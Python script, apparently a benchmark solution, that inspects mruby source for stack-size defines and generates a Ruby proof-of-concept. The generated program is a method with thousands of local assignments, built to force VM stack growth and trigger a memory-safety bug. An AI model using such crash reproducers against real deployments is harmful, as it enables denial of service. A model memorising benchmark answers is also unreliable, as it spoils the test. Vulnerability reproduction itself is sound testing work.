import os
import re
import tarfile
from typing import Optional, Tuple


def _parse_int_literal(s: str) -> Optional[int]:
    s = s.strip()
    if not s:
        return None
    s = s.split()[0]
    s = s.strip("()")
    try:
        return int(s, 0)
    except Exception:
        return None


def _find_define_in_text(text: str, name: str) -> Optional[int]:
    # Match:
    #   #define NAME 123
    #   #define NAME (123)
    #   #define NAME 0x4000
    m = re.search(r'^[ \t]*#[ \t]*define[ \t]+' + re.escape(name) + r'[ \t]+([^\r\n/]+)', text, re.MULTILINE)
    if not m:
        return None
    val = m.group(1).strip()
    val = val.split("/*", 1)[0].strip()
    val = val.split("//", 1)[0].strip()
    return _parse_int_literal(val)


def _iter_text_files_in_dir(root: str):
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not (fn.endswith(".c") or fn.endswith(".h") or fn.endswith(".cc") or fn.endswith(".hpp") or fn.endswith(".cpp")):
                continue
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 4 * 1024 * 1024:
                continue
            yield p


def _extract_defines_from_dir(root: str) -> Tuple[Optional[int], Optional[int]]:
    init_sz = None
    max_sz = None

    preferred = []
    for cand in ("include/mrbconf.h", "src/vm.c", "src/vm.h", "src/fiber.c", "src/state.c"):
        p = os.path.join(root, cand)
        if os.path.isfile(p):
            preferred.append(p)

    checked = set()
    for p in preferred:
        checked.add(p)
        try:
            with open(p, "rb") as f:
                data = f.read()
            text = data.decode("utf-8", "ignore")
        except Exception:
            continue
        if init_sz is None:
            init_sz = _find_define_in_text(text, "MRB_STACK_INIT_SIZE")
        if max_sz is None:
            max_sz = _find_define_in_text(text, "MRB_STACK_MAX")
        if max_sz is None:
            max_sz = _find_define_in_text(text, "MRB_STACK_MAX_SIZE")
        if init_sz is not None and max_sz is not None:
            return init_sz, max_sz

    for p in _iter_text_files_in_dir(root):
        if p in checked:
            continue
        try:
            with open(p, "rb") as f:
                data = f.read()
            text = data.decode("utf-8", "ignore")
        except Exception:
            continue
        if init_sz is None:
            init_sz = _find_define_in_text(text, "MRB_STACK_INIT_SIZE")
        if max_sz is None:
            max_sz = _find_define_in_text(text, "MRB_STACK_MAX")
        if max_sz is None:
            max_sz = _find_define_in_text(text, "MRB_STACK_MAX_SIZE")
        if init_sz is not None and max_sz is not None:
            break

    return init_sz, max_sz


def _read_member_text(t: tarfile.TarFile, member: tarfile.TarInfo) -> Optional[str]:
    if member.size <= 0 or member.size > 4 * 1024 * 1024:
        return None
    try:
        f = t.extractfile(member)
        if f is None:
            return None
        data = f.read()
        return data.decode("utf-8", "ignore")
    except Exception:
        return None


def _extract_defines_from_tar(tar_path: str) -> Tuple[Optional[int], Optional[int]]:
    init_sz = None
    max_sz = None

    try:
        with tarfile.open(tar_path, "r:*") as t:
            members = t.getmembers()
            preferred_suffixes = (
                "/include/mrbconf.h",
                "/src/vm.c",
                "/src/vm.h",
                "/src/fiber.c",
                "/src/state.c",
            )

            preferred = []
            others = []
            for m in members:
                if not m.isfile():
                    continue
                name = m.name
                if name.endswith(preferred_suffixes):
                    preferred.append(m)
                elif name.endswith((".c", ".h", ".cc", ".cpp", ".hpp")):
                    others.append(m)

            for m in preferred + others:
                text = _read_member_text(t, m)
                if not text:
                    continue
                if init_sz is None:
                    init_sz = _find_define_in_text(text, "MRB_STACK_INIT_SIZE")
                if max_sz is None:
                    max_sz = _find_define_in_text(text, "MRB_STACK_MAX")
                if max_sz is None:
                    max_sz = _find_define_in_text(text, "MRB_STACK_MAX_SIZE")
                if init_sz is not None and max_sz is not None:
                    break
    except Exception:
        return None, None

    return init_sz, max_sz


def _choose_locals_count(init_sz: Optional[int], max_sz: Optional[int]) -> int:
    init = init_sz if isinstance(init_sz, int) and init_sz > 0 else 128

    desired_regs = max(init * 24, 3072)  # force large growth
    if isinstance(max_sz, int) and max_sz > 0:
        # Some builds treat MRB_STACK_MAX as number of slots; be conservative.
        # Keep enough headroom to avoid "stack overflow" in fixed builds.
        hard_cap = max(256, max_sz - 128)
        desired_regs = min(desired_regs, hard_cap)

    # Ensure still above init enough to trigger extension
    if desired_regs <= init + 64:
        desired_regs = init + 256

    # locals_count ~ nregs - (self + args + temps); keep it close
    locals_count = max(512, desired_regs - 8)

    # keep source size reasonable
    locals_count = min(locals_count, 8000)
    return locals_count


def _generate_ruby_poc(locals_count: int) -> bytes:
    per_line = 80
    lines = []
    cur = []

    for i in range(locals_count):
        cur.append(f"a{i}=0")
        if len(cur) >= per_line:
            lines.append(";".join(cur) + ";")
            cur = []
    if cur:
        lines.append(";".join(cur) + ";")

    assigns = "\n    ".join(lines)

    src = (
        "class C\n"
        "  def self.m(x)\n"
        f"    {assigns}\n"
        "    x\n"
        "  end\n"
        "end\n"
        "C.m(1)\n"
    )
    return src.encode("utf-8")


class Solution:
    def solve(self, src_path: str) -> bytes:
        init_sz = None
        max_sz = None

        if src_path and os.path.isdir(src_path):
            init_sz, max_sz = _extract_defines_from_dir(src_path)
        elif src_path and os.path.isfile(src_path):
            init_sz, max_sz = _extract_defines_from_tar(src_path)

        locals_count = _choose_locals_count(init_sz, max_sz)
        return _generate_ruby_poc(locals_count)